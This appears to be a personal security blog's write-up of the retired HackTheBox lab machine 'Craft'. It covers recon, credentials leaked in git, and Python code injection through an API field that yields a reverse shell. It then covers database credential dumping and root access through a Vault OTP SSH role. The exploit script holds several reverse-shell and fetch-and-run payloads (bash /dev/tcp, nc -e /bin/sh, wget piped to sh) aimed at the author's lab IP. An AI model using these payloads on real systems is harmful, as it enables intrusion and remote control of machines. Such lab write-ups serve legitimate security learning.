
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Craft This box is classified as a medium machine. The user part is quit long and involve to find &#34;secrets&#34; in a git repository, access an API to get a reverse shell and manipulate a MySQL database in a jailed environment. The root part is quit easier and involve to interact with a vault instance." />
<meta name="keywords" content="security, boot2root, HTB, git, gogs, api, vault, linux">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Craft"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Craft This box is classified as a medium machine. The user part is quit long and involve to find &#34;secrets&#34; in a git repository, access an API to get a reverse shell and manipulate a MySQL database in a jailed environment. The root part is quit easier and involve to interact with a vault instance."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/01/htb-craft.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-01-05 10:35:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="git"/>
  <meta property="article:tag" content="gogs"/>
  <meta property="article:tag" content="api"/>
  <meta property="article:tag" content="vault"/>
  <meta property="article:tag" content="linux"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Craft</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
      </a>

      <h1>
        <a href="../../">maggick's logs</a>
      </h1>

<p>Offensive security tales</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-craft">HTB: Craft</h1>
    <p>
      Posted on 05 Jan 2020 in <a href="../../category/security.html">security</a>

        &#8226; 6 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.01/craft_card.png" alt="Craft card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/197">Craft</a>
This box is classified as a medium machine. The user part is quit long and
involve to find "secrets" in a git repository, access an API to get a
reverse shell and manipulate a MySQL database in a jailed environment. The root
part is quit easier and involve to interact with a vault instance.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110
Nmap scan report for 10.10.10.110
Host is up (0.15s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.15.8
6022/tcp open  ssh      (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V=7.80%I=7%D=11/8%Time=5DC57F7D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,&quot;SSH-2\.0-Go\r\n&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  8 15:45:26 2019 -- 1 IP address (1 host up) scanned in 704.14 seconds
</code></pre></div>

<h2>Web</h2>
<p>The website present the Craft database for <strong>beers</strong>!</p>
<blockquote>
<p>Craft aims to be the largest repository of US-produced craft brews accessible
over REST. In the future we will release a mobile app to interface with our
public rest API as well as a brew submission process, but for now, check out our API!</p>
</blockquote>
<p>There is also a link to a <a href="https://gogs.io/">gogs</a> as well as the API. This
links redirect to some subdomain. Let us add some informations in our
<code>/etc/hosts</code>.</p>
<div class="highlight"><pre><span></span><code>cat /etc/hosts
127.0.0.1   localhost
127.0.1.1   kalili
10.10.10.110    craft.htb
10.10.10.110    api.craft.htb
10.10.10.110    gogs.craft.htb
</code></pre></div>

<h2>GOGS</h2>
<p>On the gogs commit we can found the credentials of an user used for testing purpose in
the commit <code>10e3ba4f0a09c778d7cec673f28d410b73455a86</code> in the file
<code>test/test.py</code>.</p>
<p><img alt="git file" src="/media/2020.01/craft_1.png"></p>
<p>This creds allow us to interct with the API. Moreover the <code>test.py</code> script take
care to generate a valid token and let us directly interact with the API. The
quote are a bit a pain in the ass here. Nevertheless we can validate the code
execution using a python simpleHTTPserver on our end and execute <code>wget 10.10.14.51:8081/$(&lt;command&gt;)</code>
server side.</p>
<p>At least we get a reverse shell.</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>


<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/auth/login&#39;</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;dinesh&#39;</span><span class="p">,</span> <span class="s1">&#39;4aUh0A8PbVJxgd&#39;</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s1">&#39;X-Craft-API-Token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>  <span class="p">}</span>

<span class="c1"># make sure token is valid</span>
<span class="c1">#response = requests.get(&#39;https://api.craft.htb/api/auth/check&#39;, headers=headers, verify=False, proxies=proxies)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/auth/check&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># create a sample brew with bogus ABV... should fail.</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Create bogus ABV brew&quot;</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.51/7777 0&gt;&amp;1&quot;)&#39;</span>
<span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;wget 10.10.14.51:8081/$(ls ./lolll.sh)&quot;)&#39;</span>
<span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;ncat 10.10.14.51 4444 -e /bin/sh &amp;&quot;)&#39;</span>
<span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;wget -O - 10.10.14.51:8081/shell.py | sh&quot;)&#39;</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;abv&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;__import__(</span><span class="se">\&#39;</span><span class="s1">os</span><span class="se">\&#39;</span><span class="s1">).popen(</span><span class="se">\&#39;</span><span class="s1">nc 10.10.14.194 7777 -e /bin/sh</span><span class="se">\&#39;</span><span class="s1">).read()&#39;</span>
<span class="c1">#brew_dict[&#39;abv&#39;] = &#39;0.15&#39;</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bullshit&#39;</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;brewer&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bullshit&#39;</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;style&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bullshit&#39;</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">json_data</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/brew/&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div>

<h2>API: reverse shell</h2>
<p>Once we get a relay on the box we notice that we are root… but in a docker.</p>
<div class="highlight"><pre><span></span><code>cat release_agent
/var/lib/docker/overlay2/28e271a4328612a47294bbae8c8b7f01470e29454eef499b5beda147a55000e0/diff/c
uname -a
Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux
cat /proc/1/cgroup
10:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
9:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
8:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
7:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
6:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
5:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
4:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
3:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
</code></pre></div>

<h2>MySQL</h2>
<p>We explorer the application folder and found some database settings.</p>
<div class="highlight"><pre><span></span><code>cat craft_api/settings.py
# Flask settings
FLASK_SERVER_NAME = &#39;api.craft.htb&#39;
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &#39;list&#39;
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = &#39;hz66OCkDtv8G6D&#39;

# database
MYSQL_DATABASE_USER = &#39;craft&#39;
MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39;
MYSQL_DATABASE_DB = &#39;craft&#39;
MYSQL_DATABASE_HOST = &#39;db&#39;
SQLALCHEMY_TRACK_MODIFICATIONS = False
</code></pre></div>

<p>In order to have a "better" shell we can use <code>/bin/sh -i</code></p>
<p>There is a <code>dbtest.py</code> script that allow us to test the connection to the
database. We cat that script in a new one in order to change the SQL line to
list the <code>users</code>'s table. At first I tried with a <code>from users</code>. As there was no
result I tried with the following:</p>
<div class="highlight"><pre><span></span><code>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py
/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py
/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py
/opt/app # tail -n 6 dbtest.py &gt;&gt; dbtest2.py
/opt/app # python dbtest2.py
{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}
</code></pre></div>

<p>We get only one user because the <code>dbtest.py</code> script use the <code>cursor.fetchone()</code> function.
The <code>pymysql</code> <a href="https://pymysql.readthedocs.io/en/latest/modules/cursors.html">documentation</a>
indicate that we want to use the <code>cursor.fetchall()</code> function. We modify our
"script":</p>
<div class="highlight"><pre><span></span><code>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py
/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py
/opt/app # echo &#39;        cursor.execute(sql)&#39;&gt;&gt;dbtest2.py
/opt/app # echo &#39;        result = cursor.fetchall()&#39;&gt;&gt;dbtest2.py
/opt/app # tail -n 4 dbtest.py &gt;&gt;dbtest2.py
/opt/app # python dbtest2.py
[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]
</code></pre></div>

<p>We can then connect to the GOGS with the <code>gilfoyle</code> credentials.</p>
<p>This user has a private repository containing sensitive information as his private
SSH key. The key is protected by a passphrase. That passhrase is his password!
We need to copy his private and public key in our <code>.ssh</code> folder. We also need to
change the private key permission (<code>chmod 600</code>). We can then SSH to the machine
and get the user flag:</p>
<div class="highlight"><pre><span></span><code>ssh craft.htb -l gilfoyle


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
  |\_________/|/ _ \
  |  |  |  |  | / | |
  |  |  |  |  | | | |
  |  |  |  |  | | | |
  |  |  |  |  | | | |
  |  |  |  |  | | | |
  |  |  |  |  | \_| |
  |  |  |  |  |\___/
  |\_|__|__|_/|
    \_________/



Enter passphrase for key &#39;/root/.ssh/id_rsa&#39;:
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gilfoyle@craft:~$ ls
user.txt
gilfoyle@craft:~$ cat user.txt
bbf4b&lt;redacted&gt;
</code></pre></div>

<h1>getting root</h1>
<h2>enumeration</h2>
<p>When listing the <code>gilfoyle</code> home folder we found a <code>.vault-token</code> file
containing a <a href="https://www.vaultproject.io/">vault</a> token.</p>
<div class="highlight"><pre><span></span><code>gilfoyle@craft:~$ ls -al
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo
gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
</code></pre></div>

<h2>Vault</h2>
<p>In order to use vault, when need to authenticate ourself with the token.</p>
<div class="highlight"><pre><span></span><code>gilfoyle@craft:~$ vault login
Token (will be hidden):
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       [&quot;root&quot;]
identity_policies    []
policies             [&quot;root&quot;]
</code></pre></div>

<p>We are member of the vault's
<a href="https://www.vaultproject.io/docs/concepts/policies.html#root-policy">root policy</a>
meaning that we can access everything stored on the vault.</p>
<p>The vault is unsealed. Therefore we can directly access to the data. If this vault
was sealed we will need 3 of the 5 keys to unsealed
the vault (with the <em>shamir</em> seal type).</p>
<div class="highlight"><pre><span></span><code>gilfoyle@craft:~$ vault status
Key             Value
---             -----
Seal Type       shamir
Initialized     false
Sealed          false
Total Shares    5
Threshold       3
Version         0.11.1
Cluster Name    vault-cluster-cb7e66f9
Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7
HA Enabled      false
</code></pre></div>

<p>We can list the secret engine enable on the vault.</p>
<div class="highlight"><pre><span></span><code>gilfoyle@craft:~$ vault secrets list
Path          Type         Accessor              Description
----          ----         --------              -----------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
identity/     identity     identity_56533c34     identity store
secret/       kv           kv_2d9b0109           key/value secret storage
ssh/          ssh          ssh_3bbd5276          n/a
sys/          system       system_477ec595       system endpoints used for control, policy and debugging
</code></pre></div>

<p>In the <code>craf-infra</code> repository there is a <code>vault</code> folder containing a
<code>secret.sh</code> file. This file show wich secrets are created: An ssh acces for the
root user.</p>
<div class="highlight"><pre><span></span><code>craft-infra/vault# cat secrets.sh
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
</code></pre></div>

<p>Therefore we just need to use the <code>vault</code>'s <code>ssh</code> command to connect as <code>root</code>
on <code>localhost</code> with the <code>otp</code> mode. We are root on the machine and can access
the flag.</p>
<div class="highlight"><pre><span></span><code>gilfoyle@craft:~$ vault ssh -mode=otp root@127.0.0.1
WARNING: No -role specified. Use -role to tell Vault which ssh role to use for
authentication. In the future, you will need to tell Vault which role to use.
For now, Vault will attempt to guess based on the API response. This will be
removed in the Vault 1.1.
Vault SSH: Role: &quot;root_otp&quot;
Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: fb100502-b40c-9f60-aa35-f90a5000a2a3


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
  |\_________/|/ _ \
  |  |  |  |  | / | |
  |  |  |  |  | | | |
  |  |  |  |  | | | |
  |  |  |  |  | | | |
  |  |  |  |  | | | |
  |  |  |  |  | \_| |
  |  |  |  |  |\___/
  |\_|__|__|_/|
    \_________/



Password:
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 04:53:14 2019
root@craft:~# cat root.txt
831d6&lt;redacted&gt;
</code></pre></div>

<h1>Wrapping up</h1>
<p>This box was really interesting as everything is applicable in real life. The
user part was quit long (compared to the user part) and getting a working
reverse shell was a brain crusher. For the root part it was quit easy but allow
me to learn more about <a href="https://www.vaultproject.io">vault</a>.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/git.html">git</a>
      <a href="../../tag/gogs.html">gogs</a>
      <a href="../../tag/api.html">api</a>
      <a href="../../tag/vault.html">vault</a>
      <a href="../../tag/linux.html">linux</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2019/12/htb-wall.html" title="HTB: Wall">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/01/htb-bitlab.html" title="HTB: Bitlab">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>